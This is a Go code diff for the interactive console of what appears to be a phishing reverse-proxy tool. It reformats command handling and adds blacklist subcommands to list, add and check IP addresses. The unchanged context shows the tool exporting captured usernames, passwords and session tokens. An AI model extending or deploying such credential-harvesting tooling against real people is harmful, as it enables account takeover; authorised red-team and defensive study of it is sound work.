@@ -31,6 +31,15 @@ const (
 	LAYER_TOP      = 1
 )
 
+var (
+	lblue  = color.New(color.FgHiBlue)
+	dgray  = color.New(color.FgHiBlack)
+	lgreen = color.New(color.FgHiGreen)
+	yellow = color.New(color.FgYellow)
+	lred   = color.New(color.FgHiRed)
+	cyan   = color.New(color.FgCyan)
+)
+
 type Terminal struct {
 	rl        *readline.Instance
 	completer *readline.PrefixCompleter
@@ -124,59 +133,59 @@ func (t *Terminal) ProcessCommand(line string) bool {
 
 	cmd_ok := false
 	switch args[0] {
-		case "clear":
-			cmd_ok = true
-			readline.ClearScreen(color.Output)
-		case "config":
-			cmd_ok = true
-			err := t.handleConfig(args[1:])
-			if err != nil {
-				log.Error("config: %v", err)
+	case "clear":
+		cmd_ok = true
+		readline.ClearScreen(color.Output)
+	case "config":
+		cmd_ok = true
+		err := t.handleConfig(args[1:])
+		if err != nil {
+			log.Error("config: %v", err)
+		}
+	case "proxy":
+		cmd_ok = true
+		err := t.handleProxy(args[1:])
+		if err != nil {
+			log.Error("proxy: %v", err)
+		}
+	case "sessions":
+		cmd_ok = true
+		err := t.handleSessions(args[1:])
+		if err != nil {
+			log.Error("sessions: %v", err)
+		}
+	case "phishlets":
+		cmd_ok = true
+		err := t.handlePhishlets(args[1:])
+		if err != nil {
+			log.Error("phishlets: %v", err)
+		}
+	case "lures":
+		cmd_ok = true
+		err := t.handleLures(args[1:])
+		if err != nil {
+			log.Error("lures: %v", err)
+		}
+	case "blacklist":
+		cmd_ok = true
+		err := t.handleBlacklist(args[1:])
+		if err != nil {
+			log.Error("blacklist: %v", err)
+		}
+	case "help":
+		cmd_ok = true
+		if len(args) == 2 {
+			if err := t.hlp.PrintBrief(args[1]); err != nil {
+				log.Error("help: %v", err)
 			}
-		case "proxy":
-			cmd_ok = true
-			err := t.handleProxy(args[1:])
-			if err != nil {
-				log.Error("proxy: %v", err)
-			}
-		case "sessions":
-			cmd_ok = true
-			err := t.handleSessions(args[1:])
-			if err != nil {
-				log.Error("sessions: %v", err)
-			}
-		case "phishlets":
-			cmd_ok = true
-			err := t.handlePhishlets(args[1:])
-			if err != nil {
-				log.Error("phishlets: %v", err)
-			}
-		case "lures":
-			cmd_ok = true
-			err := t.handleLures(args[1:])
-			if err != nil {
-				log.Error("lures: %v", err)
-			}
-		case "blacklist":
-			cmd_ok = true
-			err := t.handleBlacklist(args[1:])
-			if err != nil {
-				log.Error("blacklist: %v", err)
-			}
-		case "help":
-			cmd_ok = true
-			if len(args) == 2 {
-				if err := t.hlp.PrintBrief(args[1]); err != nil {
-					log.Error("help: %v", err)
-				}
-			} else {
-				t.hlp.Print(0)
-			}
-		case "q", "quit", "exit":
-			return true
-		default:
-			log.Error("unknown command: %s", args[0])
-			cmd_ok = true
+		} else {
+			t.hlp.Print(0)
+		}
+	case "q", "quit", "exit":
+		return true
+	default:
+		log.Error("unknown command: %s", args[0])
+		cmd_ok = true
 	}
 	if !cmd_ok {
 		log.Error("invalid syntax: %s", line)
@@ -243,6 +252,32 @@ func (t *Terminal) handleBlacklist(args []string) error {
 			return nil
 		case "off":
 			t.cfg.SetBlacklistMode(args[0])
+			return nil
+		case "show":
+			ips, err := t.p.bl.IPs()
+			if err != nil {
+				log.Error("%v", err)
+				break
+			}
+			if len(ips) > 0 {
+				log.Printf("\n%s\n", AsSingleColTable("ip", ips))
+			} else {
+				log.Printf("%s", dgray.Sprintf("none"))
+			}
+			return nil
+		}
+	} else if pn >= 2 {
+		switch args[0] {
+		case "add":
+			err := t.p.bl.AddIP(args[1:]...)
+			if err != nil {
+				log.Error("%v", err)
+				return nil
+			}
+			return nil
+		case "exists":
+			exists := t.p.bl.IsBlacklisted(args[1])
+			log.Success("%v", exists)
 			return nil
 		}
 	}
@@ -329,12 +364,6 @@ func (t *Terminal) handleProxy(args []string) error {
 }
 
 func (t *Terminal) handleSessions(args []string) error {
-	lblue := color.New(color.FgHiBlue)
-	dgray := color.New(color.FgHiBlack)
-	lgreen := color.New(color.FgHiGreen)
-	yellow := color.New(color.FgYellow)
-	lred := color.New(color.FgHiRed)
-	cyan := color.New(color.FgCyan)
 
 	pn := len(args)
 	if pn == 0 {
@@ -508,13 +537,13 @@ func (t *Terminal) handleSessions(args []string) error {
 				log.Info("exported sessions to csv: %s", outFile.Name())
 			case "json":
 				type ExportedSession struct {
-					Id string `json:"id"`
-					Phishlet string `json:"phishlet"`
-					Username string `json:"username"`
-					Password string `json:"password"`
-					Tokens string `json:"tokens_base64_encoded"`
+					Id         string `json:"id"`
+					Phishlet   string `json:"phishlet"`
+					Username   string `json:"username"`
+					Password   string `json:"password"`
+					Tokens     string `json:"tokens_base64_encoded"`
 					RemoteAddr string `json:"remote_ip"`
-					Time string `json:"time"`
+					Time       string `json:"time"`
 				}
 				var exported []*ExportedSession
 				for _, s := range sessions {
@@ -524,13 +553,13 @@ func (t *Terminal) handleSessions(args []string) error {
 						break
 					}
 					es := &ExportedSession{
-						Id: strconv.Itoa(s.Id),
-						Phishlet: s.Phishlet,
-						Username: s.Username,
-						Password: s.Password,
-						Tokens: base64.StdEncoding.EncodeToString([]byte(t.tokensToJSON(pl, s.Tokens))),
+						Id:         strconv.Itoa(s.Id),
+						Phishlet:   s.Phishlet,
+						Username:   s.Username,
+						Password:   s.Password,
+						Tokens:     base64.StdEncoding.EncodeToString([]byte(t.tokensToJSON(pl, s.Tokens))),
 						RemoteAddr: s.RemoteAddr,
-						Time: time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
+						Time:       time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
 					}
 					exported = append(exported, es)
 				}
@@ -1116,6 +1145,9 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
 	h.AddSubCommand("blacklist", []string{"unauth"}, "unauth", "block and blacklist ip addresses only for unauthorized requests")
 	h.AddSubCommand("blacklist", []string{"off"}, "off", "never add any ip addresses to blacklist")
+	h.AddSubCommand("blacklist", []string{"show"}, "show", "list all blacklisted ip addresses")
+	h.AddSubCommand("blacklist", []string{"add"}, "add <ip> <ip> ...", "add one or more ips to blacklist")
+	h.AddSubCommand("blacklist", []string{"exists"}, "exists <ip>", "verifies if the given ip is already blacklisted")
 
 	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
 		readline.PcItem("clear"))
